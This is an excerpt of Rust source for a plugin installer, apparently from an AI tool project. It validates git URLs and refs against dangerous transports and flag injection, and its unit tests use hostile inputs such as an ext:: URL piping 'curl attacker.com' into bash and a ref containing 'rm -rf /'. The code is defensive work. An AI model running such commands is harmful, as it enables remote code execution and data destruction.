...
/// Validate that a plugin git URL uses an allowed protocol.
///
/// Only `https://` and `git@` (SSH) are permitted. Protocols such as
/// `file://`, `ext::`, `git://`, `http://`, and `ssh://` are rejected to
/// prevent local-file reads, arbitrary command execution via git's `ext::`
/// transport, and cleartext transmission.
fn validate_git_url(url: &str) -> Result<(), InstallError> {
    if url.starts_with("https://") || url.starts_with("git@") {
        return Ok(());
    }
    Err(InstallError::InstallFailed {
        detail: format!(
            "blocked: only https:// and git@ URLs are allowed for plugin installation \
             (got: {url}). Protocols such as file://, ext::, git://, and http:// are \
             not permitted."
        ),
    })
}

/// Validate that a git ref (branch, tag, or commit-ish) is safe to pass as
/// `--branch <ref>` to git.
///
/// Allowed characters: ASCII alphanumeric, `.`, `-`, `_`, `/`.
/// The ref must not start with `-` (which git would interpret as a flag).
fn validate_git_ref(git_ref: &str) -> Result<(), InstallError> {
    if git_ref.starts_with('-') {
        return Err(InstallError::InstallFailed {
            detail: format!(
                "blocked: git ref must not start with '-' (got: {git_ref:?})"
            ),
        });
    }
    let valid = git_ref
    ...
    if !valid {
        return Err(InstallError::InstallFailed {
            detail: format!(
                "blocked: git ref contains invalid characters (got: {git_ref:?}). \
...
fn clone_repo(
    ...
    // Security: validate the URL protocol and ref before invoking git.
    // This prevents file://, ext::, and other dangerous git transports, and
    // stops a crafted ref from injecting flags into the git command line.
    validate_git_url(url)?;
    if let Some(r) = git_ref {
        validate_git_ref(r)?;
    }
    if let Some(sha) = git_sha {
        // SHA-pinned clones also validate the ref (used as --branch in some
        // paths) but the SHA itself is validated by clone_repo_at_sha.
...
fn run_git_in_capture(cwd: &Path, args: &[&str]) -> Result<std::process::Output, String> {
    ...
    cmd.args(args)
        ...
        .envs(ainxt_tools::util::pager_env());
    let output = cmd
        .output()
...
///
/// Each plugin has a data dir at `~/.ainxt/plugin-data/<plugin_id>/`.
...
pub fn cleanup_plugin_data(repo: &InstalledRepo, scope: super::discovery::PluginScope) {
    let plugin_data_base = ainxt_config::ainxt_home().join("plugin-data");
...
mod tests {
    ...
    #[test]
    fn validate_git_url_allows_https() {
        assert!(validate_git_url("https://github.com/user/repo").is_ok());
        assert!(validate_git_url("https://gitlab.com/org/plugin.git").is_ok());
    }

    #[test]
    fn validate_git_url_allows_ssh() {
        assert!(validate_git_url("git@github.com:user/repo.git").is_ok());
        assert!(validate_git_url("git@gitlab.com:org/plugin.git").is_ok());
    }

    #[test]
    fn validate_git_url_blocks_file_protocol() {
        let err = validate_git_url("file:///etc/passwd").unwrap_err();
        match err {
            InstallError::InstallFailed { detail } => {
                assert!(detail.contains("blocked"), "got: {detail}");
                assert!(detail.contains("file://"), "got: {detail}");
            }
            e => panic!("expected InstallFailed, got: {e:?}"),
        }
    }

    #[test]
    fn validate_git_url_blocks_ext_protocol() {
        let err = validate_git_url("ext::sh -c 'curl attacker.com | bash'").unwrap_err();
        match err {
            InstallError::InstallFailed { detail } => {
                assert!(detail.contains("blocked"), "got: {detail}");
            }
    ...
    #[test]
    fn validate_git_url_blocks_http_cleartext() {
        let err = validate_git_url("http://github.com/user/repo").unwrap_err();
        match err {
            InstallError::InstallFailed { detail } => {
                assert!(detail.contains("blocked"), "got: {detail}");
            }
    ...
    #[test]
    fn validate_git_url_blocks_git_protocol() {
        let err = validate_git_url("git://github.com/user/repo.git").unwrap_err();
        match err {
            InstallError::InstallFailed { detail } => {
                assert!(detail.contains("blocked"), "got: {detail}");
            }
    ...
    #[test]
    fn validate_git_ref_blocks_shell_metacharacters() {
        for bad_ref in [";rm -rf /", "$(evil)", "`evil`", "ref|pipe"] {
            let err = validate_git_ref(bad_ref).unwrap_err();
            match err {
                InstallError::InstallFailed { detail } => {
                    assert!(detail.contains("blocked"), "ref={bad_ref:?} got: {detail}");
                }
                e => panic!("expected InstallFailed for ref={bad_ref:?}, got: {e:?}"),
            }
        }
    }
